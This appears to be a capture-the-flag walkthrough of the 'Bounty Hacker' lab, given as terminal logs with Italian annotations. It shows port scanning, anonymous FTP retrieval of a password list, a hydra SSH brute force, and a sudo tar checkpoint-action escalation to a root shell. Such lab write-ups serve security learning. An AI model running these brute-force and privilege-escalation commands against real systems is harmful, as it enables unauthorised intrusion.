@@ -1,0 +1,358 @@
+root@ip-10-10-108-134:~# nmap -v -A -p- -T4 10.10.146.251
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2023-05-14 11:47 BST
+NSE: Loaded 146 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 11:47
+Completed NSE at 11:47, 0.00s elapsed
+Initiating NSE at 11:47
+Completed NSE at 11:47, 0.00s elapsed
+Initiating ARP Ping Scan at 11:47
+Scanning 10.10.146.251 [1 port]
+Completed ARP Ping Scan at 11:47, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:47
+Completed Parallel DNS resolution of 1 host. at 11:47, 0.00s elapsed
+Initiating SYN Stealth Scan at 11:47
+Scanning ip-10-10-146-251.eu-west-1.compute.internal (10.10.146.251) [65535 ports]
+Discovered open port 80/tcp on 10.10.146.251
+Discovered open port 21/tcp on 10.10.146.251
+Discovered open port 22/tcp on 10.10.146.251
+
+ftp 10.10.64.209
+Connected to 10.10.64.209.
+220 (vsFTPd 3.0.3)
+Name (10.10.64.209:root): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+
+ftp> get locks.txt
+local: locks.txt remote: locks.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for locks.txt (418 bytes).
+226 Transfer complete.
+418 bytes received in 0.12 secs (3.5207 kB/s)
+ftp> get task.txt
+local: task.txt remote: task.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for task.txt (68 bytes).
+226 Transfer complete.
+68 bytes received in 0.07 secs (0.9392 kB/s)
+
+
+root@ip-10-10-108-134:~# cat locks.txt
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+ReddRA60N
+R3dDrag0nSynd1c4te
+dRa6oN5YNDiCATE
+ReDDR4g0n5ynDIc4te
+R3Dr4gOn2044
+RedDr4gonSynd1cat3
+R3dDRaG0Nsynd1c@T3
+Synd1c4teDr@g0n
+reddRAg0N
+REddRaG0N5yNdIc47e
+Dra6oN$yndIC@t3
+4L1mi6H71StHeB357
+rEDdragOn$ynd1c473
+DrAgoN5ynD1cATE
+ReDdrag0n$ynd1cate
+Dr@gOn$yND1C4Te
+RedDr@gonSyn9ic47e
+REd$yNdIc47e
+dr@goN5YNd1c@73
+rEDdrAGOnSyNDiCat3
+r3ddr@g0N
+ReDSynd1ca7e
+
+root@ip-10-10-108-134:~# cat task.txt
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin
+
+root@ip-10-10-108-134:~# hydra -l lin -P /root/locks.txt 10.10.146.251 ssh
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2023-05-14 11:03:58
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://10.10.146.251:22/
+[22][ssh] host: 10.10.146.251   login: lin   password: [REDACTED]
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2023-05-14 11:04:02
+
+root@ip-10-10-108-134:~# ssh lin@10.10.146.251 	
+lin@10.10.146.251's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+83 packages can be updated.
+0 updates are security updates.
+
+Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
+
+lin@bountyhacker:~/Desktop$ pwd
+/home/lin/Desktop
+lin@bountyhacker:~/Desktop$ ls
+user.txt
+lin@bountyhacker:~/Desktop$ cat user.txt
+THM{REDACTED}
+lin@bountyhacker:~$ sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# cd /root
+# ls
+root.txt
+# cat root.txt
+THM{REDACTED}
+
+===================================================================================================	
+
+
+
+	scannerizzo con nmap l'IP obersaglio
+
+nmap -A -p- -T4 -F
+
+	A più informazioni, aggressive mode
+	p- per tutte le porte
+	T4 per rendere lo scan un po' più rapido 
+
+
+
+root@ip-10-10-108-134:~# nmap -v -A -p- -T4 10.10.146.251
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2023-05-14 11:47 BST
+NSE: Loaded 146 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 11:47
+Completed NSE at 11:47, 0.00s elapsed
+Initiating NSE at 11:47
+Completed NSE at 11:47, 0.00s elapsed
+Initiating ARP Ping Scan at 11:47
+Scanning 10.10.146.251 [1 port]
+Completed ARP Ping Scan at 11:47, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:47
+Completed Parallel DNS resolution of 1 host. at 11:47, 0.00s elapsed
+Initiating SYN Stealth Scan at 11:47
+Scanning ip-10-10-146-251.eu-west-1.compute.internal (10.10.146.251) [65535 ports]
+Discovered open port 80/tcp on 10.10.146.251
+Discovered open port 21/tcp on 10.10.146.251
+Discovered open port 22/tcp on 10.10.146.251
+
+
+
+	scopro quindi che si può loggare da "Anonymous" alla ftp
+
+	scopro 3 port aperti:
+				21 ftp
+				22 ssh
+				80 HTTP
+
+	mi collego al ftp
+
+
+
+ftp 10.10.64.209
+Connected to 10.10.64.209.
+220 (vsFTPd 3.0.3)
+Name (10.10.64.209:root): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+
+
+
+	scopro che ci sono due file disponibili: locks.txt e task.txt
+	scarico i file con il comando get
+
+
+
+ftp> get locks.txt
+local: locks.txt remote: locks.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for locks.txt (418 bytes).
+226 Transfer complete.
+418 bytes received in 0.12 secs (3.5207 kB/s)
+ftp> get task.txt
+local: task.txt remote: task.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for task.txt (68 bytes).
+226 Transfer complete.
+68 bytes received in 0.07 secs (0.9392 kB/s)
+
+
+
+	e li vado a leggere dalla mia macchina
+
+
+
+root@ip-10-10-108-134:~# cat locks.txt
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+ReddRA60N
+R3dDrag0nSynd1c4te
+dRa6oN5YNDiCATE
+ReDDR4g0n5ynDIc4te
+R3Dr4gOn2044
+RedDr4gonSynd1cat3
+R3dDRaG0Nsynd1c@T3
+Synd1c4teDr@g0n
+reddRAg0N
+REddRaG0N5yNdIc47e
+Dra6oN$yndIC@t3
+4L1mi6H71StHeB357
+rEDdragOn$ynd1c473
+DrAgoN5ynD1cATE
+ReDdrag0n$ynd1cate
+Dr@gOn$yND1C4Te
+RedDr@gonSyn9ic47e
+REd$yNdIc47e
+dr@goN5YNd1c@73
+rEDdrAGOnSyNDiCat3
+r3ddr@g0N
+ReDSynd1ca7e
+
+
+
+	questo file contiene quelle che potrebbero essere delle password, utili per accedere via SSH
+
+
+
+root@ip-10-10-108-134:~# cat task.txt
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin
+
+
+
+	"lin" potrebbe essere l'username che mi serve
+
+	ora uso hydra per il bruteforce della password relativa a "lin" attraverso il file locks.txt
+	all'IP dell'obiettivo, per l'ssh
+
+
+
+root@ip-10-10-108-134:~# hydra -l lin -P /root/locks.txt 10.10.146.251 ssh
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2023-05-14 11:03:58
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://10.10.146.251:22/
+[22][ssh] host: 10.10.146.251   login: lin   password: [REDACTED]
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2023-05-14 11:04:02
+
+
+
+	ora posso proseguire a collegarmi all'ssh
+
+
+
+root@ip-10-10-108-134:~# ssh lin@10.10.146.251 	
+lin@10.10.146.251's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+83 packages can be updated.
+0 updates are security updates.
+
+Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
+lin@bountyhacker:~/Desktop$ 
+
+
+
+	ora sono dentro BIG UP
+
+
+
+lin@bountyhacker:~/Desktop$ pwd
+/home/lin/Desktop
+lin@bountyhacker:~/Desktop$ ls
+user.txt
+lin@bountyhacker:~/Desktop$ cat user.txt
+THM{REDACTED}
+
+
+
+	ho trovato il primo file che mi serviva, ora si va per il root
+	
+	posso usare "sudo", che serve per fare PrivEsc (escalation di privilegi per ottenere i 		permessi)
+	con "sudo -l" posso vedere quali privilegi possiede "lin" nel sistema
+
+
+
+lin@bountyhacker:~$ sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+
+
+
+	ecco l'importanza di conoscere le nostre risorse esterne, come GTFOBins
+	abbiamo visto che lin può utilizzare tar quindi si cerca come si può usare per ottenere la
+	root shell
+
+	sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+	"It can be used to break out from restricted environments by spawning an interactive system 		shell."
+
+	e questo è il comando utile trovato, proviamolo:
+
+
+
+lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# 
+
+
+
+	privilegi di lin abusati con successo
+
+	ora si va a cercare l'ultimo file
+
+
+
+# cd /root
+# ls
+root.txt
+# cat root.txt
+THM{REDACTED}
+
+
